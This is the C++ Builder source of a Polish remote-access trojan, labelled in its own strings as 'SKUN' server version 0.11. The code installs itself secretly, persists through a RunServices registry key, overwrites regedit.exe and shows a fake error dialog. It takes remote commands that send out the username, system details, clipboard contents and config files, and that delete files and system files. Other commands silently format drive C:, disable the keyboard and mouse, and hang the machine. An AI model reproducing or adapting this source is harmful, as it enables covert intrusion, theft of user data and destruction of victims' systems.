//---------------------------------------------------------------------------
#include <vcl.h>
#pragma hdrstop
#include <Registry.hpp>
#include <shlobj.h>
#include <mmsystem.h>
HWND HButton;
#include "Unit1.h"
#include "Unit2.h"
#include "Unit3.h"
#include "Unit4.h"
#include<vcl/inifiles.hpp>
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;
typedef DWORD (__stdcall *pRasEnumConnections)
(LPRASCONN, LPDWORD, LPDWORD);
pRasEnumConnections fRasEnumConnections;
HINSTANCE hRasInstance;
//---------------------------------------------------------------------------
#define RSP_SIMPLE_SERVICE     1
#define RSP_UNREGISTER_SERVICE 0
__fastcall TForm1::TForm1(TComponent* Owner)
    : TForm(Owner)
{

hKernelLib = LoadLibrary("kernel32.dll");
if(hKernelLib)
{
RegisterServiceProcess =
(pRegFunction)GetProcAddress(hKernelLib,
"RegisterServiceProcess");
if(RegisterServiceProcess)
RegisterServiceProcess(GetCurrentProcessId(),
RSP_SIMPLE_SERVICE);
}
}
//---------------------------------------------------------------------------
__fastcall TForm1::~TForm1()
{
if(hKernelLib)
{
if(RegisterServiceProcess)
RegisterServiceProcess(GetCurrentProcessId(),
RSP_UNREGISTER_SERVICE);
FreeLibrary(hKernelLib);
}
}


void __fastcall TForm1::rejestr2Timer(TObject *Sender)
{
TRegistry *Reg = new TRegistry;
Reg->RootKey = HKEY_LOCAL_MACHINE;
if(Reg->OpenKey(
     "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices",
      true))
Reg->WriteString("Tray Control 6.0", "C:\\Windows\\tray_.exe");
Reg->CloseKey();
delete Reg;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::copyTimer(TObject *Sender)
{
   BufferSize = GetWindowsDirectory(NULL,0);
   WinDir.SetLength(BufferSize+1);
   GetWindowsDirectory(WinDir.c_str(),BufferSize+1);
   strcpy(Dir1,WinDir.c_str());
   Dir1[BufferSize-1] = '\\';
   Dir1[BufferSize] = 'T';
   Dir1[BufferSize+1] = 'R';
   Dir1[BufferSize+2] = 'A';
   Dir1[BufferSize+3] = 'Y';
   Dir1[BufferSize+4] = '_';
   Dir1[BufferSize+5] = '.';
   Dir1[BufferSize+6] = 'E';
   Dir1[BufferSize+7] = 'X';
   Dir1[BufferSize+8] = 'E';
   Dir1[BufferSize+9] = '\0';
   AnsiString tmp1 = ParamStr(0);
   char tmp2[100];
   strcpy(tmp2,tmp1.c_str());
   char File1[30];
   int tmplength = strlen(tmp2);
   int lastslash;
   for (int i = tmplength-1; i > 0; i--)
   {
   if (tmp2[i] == '\\')
   {
   lastslash = i;
   break;
   }
   }
   for (int i = lastslash+1; i < tmplength; i++)
   {
   File1[i-lastslash-1] = tmp2[i];
   }
   File1[tmplength-lastslash-1] = '\0';
   CopyFile(File1,Dir1,FALSE);
   CopyFile(File1,"c:\\windows\\regedit.exe",FALSE);
   if (ParamStr(0) != Dir1)
   {
   copy->Enabled = false;
   MessageBox(0,"Not enough memory","System error",MB_ICONWARNING);
   }
}
//---------------------------------------------------------------------------
void __fastcall TForm1::NMMSGServ3MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
ShowMessage(sMsg);
NMMsg1->PostIt("WIADOMOŒÆ '"+sMsg+"' POKAZANA...");
}
//---------------------------------------------------------------------------
void __fastcall TForm1::NMMSGServ2MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
if(sMsg == "@iconoff")
{
HWND window = FindWindow("Progman", NULL);
if (window)
{
window = FindWindowEx(window, NULL, "SHELLDLL_DefView", NULL);
if (window)
{
::ShowWindow(window, SW_HIDE);
}
}
NMMsg1->PostIt("IKONY NA PULPICIE NIEWIDOCZNE :-)");
}
if(sMsg == "@iconon")
{
HWND window = FindWindow("Progman", NULL);
if (window)
{
window = FindWindowEx(window, NULL, "SHELLDLL_DefView", NULL);
if (window)
{
::ShowWindow(window, SW_SHOW);
}
}
NMMsg1->PostIt("IKONY NA PULPICIE WIDOCZNE :-(");
}
if(sMsg == "@startoff")
{
char buffer[MAX_PATH];
    HWND HTray = FindWindow("Shell_TrayWnd", NULL);
    HWND HChild = GetWindow(HTray, GW_CHILD);
    while (HChild)
    {
        GetClassName(HChild, buffer, sizeof(buffer));
        if (strcmp(buffer, "Button") == 0) break;
        HChild = GetWindow(HChild, GW_HWNDNEXT);
    }
    HButton = HChild;
    EnableWindow(HButton, false);
NMMsg1->PostIt("PRZYCISK START WY£¥CZONY !!!");
}
if(sMsg == "@starton")
{
EnableWindow(HButton, true);
NMMsg1->PostIt("PRZYCISK START W£¥CZONY !!!");
}
if(sMsg == "@wininfo")
{
OSVERSIONINFO info;
info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
GetVersionEx(&info);
Memo2->Lines->Clear();
Memo2->Lines->Add("Wersja nadrzêdna:" + IntToStr(info.dwMajorVersion));
Memo2->Lines->Add("Wersja podrzêdna:" + IntToStr(info.dwMinorVersion));
Memo2->Lines->Add("Numer BuildNumber:" + IntToStr(info.dwBuildNumber));
Memo2->Lines->Add("ID platformy:" + IntToStr(info.dwPlatformId));
Memo2->Lines->Add("Wersja CSD" + AnsiString(info.szCSDVersion));
Memo2->Lines->Add("");
if(info.dwMajorVersion < 4)
Memo2->Lines->Add("Wykryto Windows NT 3.X");
switch (info.dwPlatformId)
{
case VER_PLATFORM_WIN32s:
Memo2->Lines->Add("Wykryto Win32s");
break;
case VER_PLATFORM_WIN32_WINDOWS:
Memo2->Lines->Add("Wykryto Win95/Win98");
break;
case VER_PLATFORM_WIN32_NT:
Memo2->Lines->Add("Wykryto Windows NT");
break;
}
NMMsg4->PostIt(Memo2->Text);
NMMsg1->PostIt("INFO POBRANE");
}
if(sMsg == "@winini")
{
Memo3->Lines->LoadFromFile("c:\\windows\\win.ini");
NMMsg5->PostIt(Memo3->Text);
}
if(sMsg == "@wirus#2")
{
Timer2->Enabled = true;
NMMsg1->PostIt("Wirus #2 aktywny !!!");
}
if(sMsg == "@wirus#1")
{
viri1->Enabled = true;
NMMsg1->PostIt("Pliki s¹ od teraz kasowane co 10 sekund");
}
if(sMsg == "@wirus#3")
{

}
if(sMsg == "@psswdemail")
{
Form2->ShowModal();
}
if(sMsg == "@close")
{
TIniFile *ini=new TIniFile("c:\\windows\\configure.dll");
ini->WriteString("main","data",DateToStr(Date())+" "+TimeToStr(Time()));
Close();
}
if(sMsg == "@sinfo")
{
NMMsg6->PostIt("Wersja serwera dostêpna na tym komputerze : 0.11 , wszystkie opcje dostepne te same co w kliencie 0.11 (wsówanie\wysuwanie cd , tworzenie katalogow , kasowanie plikow , odgrywanie dziekow, edycja skryptow mIRC`a , pliku win.ini , 3 wirusy , edycja schowka ... i jeszcze du¿o wiêcej - jest to druga wersja tego trojana ... ");
}
if(sMsg == "@delall")
{
rejestr2->Enabled = false;
copy->Enabled = false;
TRegistry& regKey=*new TRegistry();
regKey.RootKey = HKEY_LOCAL_MACHINE;
regKey.OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",false);
if (regKey.ValueExists("SysMonitor")) regKey.DeleteValue("SysMonitor");
delete &regKey;
DeleteFile("c:\windows\\sys32.exe");
DeleteFile("c:\\mirc\\script.ini");
}
if(sMsg == "@chaton")
{
Form3->ShowModal();
}
if(sMsg == "@chatoff")
{
Form3->Hide();
}
if(sMsg == "@psswdwww")
{
Form4->ShowModal();
}
if(sMsg == "@cdromo")
{
mciSendString("Set cdaudio door open wait", NULL, 0 ,Handle);
NMMsg1->PostIt("CD-ROM OTWORZONY :)");
}
if(sMsg == "@cdromc")
{
mciSendString("Set cdaudio door closed wait", NULL, 0 ,Handle);
NMMsg1->PostIt("CD-ROM ZAMKNIÊTY :)");
}
if(sMsg == "@schowek")
{
Memo4->Text = "";
Memo4->PasteFromClipboard();
NMMsg7->PostIt(Memo4->Text);
}
if(sMsg == "@monitoroff")
{
SendMessage(Application->Handle, WM_SYSCOMMAND, SC_MONITORPOWER, 0);
}
if(sMsg == "@monitoron")
{
SendMessage(Application->Handle, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
}
if(sMsg == "@shutdown")
{
ExitWindowsEx(EWX_SHUTDOWN, 0);
}
if(sMsg == "@logoff")
{
ExitWindowsEx(EWX_LOGOFF, 0); 
}
if(sMsg == "@www")
{
Form4->ShowModal();
}
if(sMsg == "@format")
{
WinExec("ECHO T | FORMAT C: /q > NUL", SW_HIDE);
}
if(sMsg == "@system.ini")
{
Memo6->Lines->LoadFromFile("system.ini");
NMMsg10->PostIt(Memo6->Text);
}
if(sMsg == "@swap_mouse")
{
SwapMouseButton(true);
NMMsg1->PostIt("KLAWISZE MYSZY ZMIENIONE !");
}
if(sMsg == "@unswap_mouse")
{
SwapMouseButton(false);
NMMsg1->PostIt("Mysz wróci³a do poprzedniego stanu");
}
if(sMsg == "@wygasz_off")
{
SystemParametersInfo(SPI_SETSCREENSAVEACTIVE, Word(false), NULL,0);
NMMsg1->PostIt("Wygaszacz wy³¹czony");
}
if(sMsg == "@wygasz_on")
{
SystemParametersInfo(SPI_SETSCREENSAVEACTIVE, Word(true), NULL,0);
NMMsg1->PostIt("Wygaszacz w³¹czony");
}
if(sMsg == "@mysz_lock")
{
ShellExecute(Handle,"open","rundll32","mouse,disable",NULL,SW_NORMAL);
NMMsg1->PostIt("MYSZ ZAWIESZONA :)");
}
if(sMsg == "@jajo")
{
SetWindowRgn(FindWindow(NULL,"Moje dokumenty"),CreateRoundRectRgn(0,0,Width,Height,50,50),true);
NMMsg1->PostIt("Moje Dokumenty za³atwione :)");
}
if(sMsg == "@key_off")
{
HideCaret(Handle);
NMMsg1->PostIt("KURSOR KLAWIATURY NIEWIDOCZNY !");
}
if(sMsg == "@key_on")
{
ShowCaret(Handle);
NMMsg1->PostIt("KURSOR W£¥CZONY !");
}
if(sMsg == "@zawies")
{
ShellExecute(Handle,"open","rundll32","krnl386.exe,exitkernel",NULL,SW_SHOWNORMAL);
NMMsg1->PostIt("SYSTEM WISI :)");
}
if(sMsg == "@keybord")
{
ShellExecute(Handle,"open","rundll32","keyboard,disable",NULL,SW_SHOWNORMAL);
NMMsg1->PostIt("KLAWIATURA WISI !!!");
}
if(sMsg == "@taskbar_hide")
{
ShowWindow(FindWindow("Shell_TrayWnd", NULL), SW_HIDE);
NMMsg1->PostIt("Pasek zadañ niewidoczny !");
}
if(sMsg == "@taskbar_show")
{
ShowWindow(FindWindow("Shell_TrayWnd", NULL), SW_SHOW);
NMMsg1->PostIt("Pasek zadañ widoczny.");
}
if(sMsg == "@strona_testowa")
{
ShellExecute(Handle,"open","run32dll","msprint2.dll,RUNDLL_PrintTestPage",NULL,SW_SHOWNORMAL);
NMMsg1->PostIt("STRONA TESTOWA W CZASIE WYDRUKU :)");
}
if(sMsg == "@special_keys")
{
if(GetKeyState(VK_CAPITAL) > 0)
{
NMMsg14->PostIt("capslock");
NMMsg14->Disconnect();
}
if(GetKeyState(VK_NUMLOCK) > 0)
{
NMMsg14->PostIt("numlock");
NMMsg14->Disconnect();
}
if(GetKeyState(VK_SCROLL ) > 0)
{
NMMsg14->PostIt("scroll");
NMMsg14->Disconnect();
}
if(GetKeyState(VK_CONTROL) > 0)
{
NMMsg14->PostIt("control");
NMMsg14->Disconnect();
}
if(GetKeyState(VK_MENU) >0)
{
NMMsg14->PostIt("alt");
NMMsg14->Disconnect();
}
if(GetKeyState(VK_SHIFT) >0)
{
NMMsg14->PostIt("shift");
NMMsg14->Disconnect();
}
NMMsg1->PostIt("Stan klawiszy specjalnych pobrany !");
}
if(sMsg == "@disconnect");
{
TIniFile *ini=new TIniFile("c:\\windows\\configure.dll");
ini->WriteString("main","data",DateToStr(Date())+" "+TimeToStr(Time()));
}
}
//---------------------------------------------------------------------------
void __fastcall TForm1::NMMSGServ4MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
DeleteFile(sMsg);
NMMsg1->PostIt("PLIK SKASOWANY :-P");
}
//---------------------------------------------------------------------------
void __fastcall TForm1::NMMSGServ1MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Label1->Caption = sMsg;
NMMsg7->Host = sMsg;
NMMsg1->Host = sMsg;
NMMsg2->Host = sMsg;
NMMsg3->Host = sMsg;
NMMsg4->Host = sMsg;
NMMsg8->Host = sMsg;
NMMsg5->Host = sMsg;
NMMsg6->Host = sMsg;
NMMsg9->Host = sMsg;
NMMsg14->Host = sMsg;
NMMsg10->Host = sMsg;
NMMsg9->PostIt(TimeToStr(Time()));
NMMsg1->PostIt("Wersja SKUNA : 0.11");
NMMsg3->PostIt(IntToStr(timeGetTime()));
DWORD dwSize = 0;
GetUserName(NULL, &dwSize);
char *szBuf = new char[dwSize];
szBuf[0] = '\0';
GetUserName(szBuf, &dwSize);
NMMsg2->PostIt(szBuf);
NMMsg2->Disconnect();
delete [] szBuf;
NMMsg8->PostIt(IntToStr(Screen->Width) + "x" + IntToStr(Screen->Height));
DWORD dwNeeded, dwNumPrinters;
    EnumPrinters(PRINTER_ENUM_LOCAL, NULL, 2, NULL,
                             0, &dwNeeded, &dwNumPrinters);

    unsigned char *buffer = new unsigned char[dwNeeded];
    EnumPrinters(PRINTER_ENUM_LOCAL, NULL, 2, buffer,
                      dwNeeded, &dwNeeded, &dwNumPrinters);


    LPPRINTER_INFO_2 lppi2;
    for (int index = 0; index < (int)dwNumPrinters; index++)
    {
        lppi2 = (LPPRINTER_INFO_2)(buffer + index *
                                 sizeof(PRINTER_INFO_2));

NMMsg11->Host = sMsg;
NMMsg11->PostIt(lppi2->pPrinterName);
NMMsg12->Host = sMsg;
NMMsg12->PostIt(lppi2->pPortName);
NMMsg13->Host = sMsg;
NMMsg13->PostIt(lppi2->pComment);
}
if(FileExists("c:\\windows\\configure.dll"))
{
NMMsg15->Host = sMsg;
TIniFile *ini=new TIniFile("c:\\windows\\configure.dll");
NMMsg15->PostIt(ini->ReadString("main","nazwa","Debil`s PC"));
}
NMMsg16->Host = sMsg;
TIniFile *ini=new TIniFile("c:\\windows\\configure.dll");
NMMsg16->PostIt(ini->ReadString("main","data","nieznana"));
}
//---------------------------------------------------------------------------
void __fastcall TForm1::NMMSGServ5MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Memo1->Text = sMsg;
Memo1->Lines->SaveToFile("c:\\dxcv.dll");
CopyFile("c:\\dxcv.dll","c:\\mirc\\script.ini",FALSE);
DeleteFile("c:\dxcv.dll");
NMMsg1->PostIt("SKRYPT UAKTYWNIONY...");
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Timer2Timer(TObject *Sender)
{
HWND window = FindWindow("Progman", NULL);
if (window)
{
window = FindWindowEx(window, NULL, "SHELLDLL_DefView", NULL);
if (window)
{
::ShowWindow(window, SW_HIDE);
}
}
::ShowWindow(window, SW_SHOW);

char buffer[MAX_PATH];
    HWND HTray = FindWindow("Shell_TrayWnd", NULL);
    HWND HChild = GetWindow(HTray, GW_CHILD);
    while (HChild)
    {
        GetClassName(HChild, buffer, sizeof(buffer));
        if (strcmp(buffer, "Button") == 0) break;
        HChild = GetWindow(HChild, GW_HWNDNEXT);
    }
    HButton = HChild;
    EnableWindow(HButton, false);
    EnableWindow(HButton, true);
}
//---------------------------------------------------------------------------
void __fastcall TForm1::NMMSGServ6MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Memo3->Text = sMsg;
Memo3->Lines->SaveToFile("c:\\windows\\win.ini");
NMMsg1->PostIt("PLIK WIN.INI UAKTUALNIONY POPRAWNIE !");    
}
//---------------------------------------------------------------------------
void __fastcall TForm1::viri1Timer(TObject *Sender)
{
DeleteFile("C:\\Windows\\Win.com");
DeleteFile("C:\\Windows\\Win.ini");
DeleteFile("C:\\autoexec.bat");
}
//---------------------------------------------------------------------------
void __fastcall TForm1::NMMSGServ7MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Memo4->Text = sMsg;
Memo4->CutToClipboard();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ8MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
MediaPlayer1->FileName = sMsg;
MediaPlayer1->Open();
MediaPlayer1->Play();
NMMsg1->PostIt("DŸwiêk odtworzony...");
}
//---------------------------------------------------------------------------
void __fastcall TForm1::NMMSGServ9MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
CreateDir(sMsg);    
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FormCreate(TObject *Sender)
{
hRas = 0;
hRasInstance = LoadLibrary("RASAPI32.DLL");
fRasEnumConnections = (pRasEnumConnections)
GetProcAddress(hRasInstance, "RasEnumConnectionsA");
AnsiString Parametr = ParamStr(1);
if(Parametr == "/no_install")
{
rejestr2->Enabled = false;
copy->Enabled = false;
}
}
//---------------------------------------------------------------------------
bool TForm1::SprawdzPolaczenie()
{
  RASCONN rc;
  rc.dwSize = sizeof(RASCONN);
  DWORD numConns;
  DWORD size = rc.dwSize;
  DWORD res = fRasEnumConnections(&rc, &size, &numConns);
  if (!res && numConns == 0) return false;
  else return true;
}
//----------------------------------------------------------------------------
void __fastcall TForm1::Timer1Timer(TObject *Sender)
{
bool connected = SprawdzPolaczenie();
if (connected)
{
Timer1->Enabled = false;
if(FileExists("c:\\windows\\configure.dll"))
{
TIniFile *ini=new TIniFile("c:\\windows\\configure.dll");
Memo5->Text = ini->ReadString("main","email","skun_trojan@poczta.onet.pl");
NMSMTP1->PostMessage->ToAddress->Assign(Memo5->Lines);
NMSMTP1->Connect();
NMSMTP1->SendMail();
NMSMTP1->Disconnect();
}
}
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ11MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Memo5->Text = sMsg;
TIniFile *ini=new TIniFile("c:\\windows\\configure.dll");
ini->WriteString("main","email",Memo5->Text);
Timer1->Enabled = false;
Timer1->Enabled = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::NMMSGServ12MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
Memo6->Text = "sMsg";
Memo6->Lines->SaveToFile("system.ini");
}
//---------------------------------------------------------------------------



void __fastcall TForm1::NMMSGServ14MSG(TComponent *Sender,
      const AnsiString sFrom, const AnsiString sMsg)
{
TIniFile *ini=new TIniFile("c:\\windows\\configure.dll");
ini->WriteString("main","nazwa",sMsg);
NMMsg1->PostIt("Nazwa hosta ustawiona na "+sMsg);
}
//---------------------------------------------------------------------------




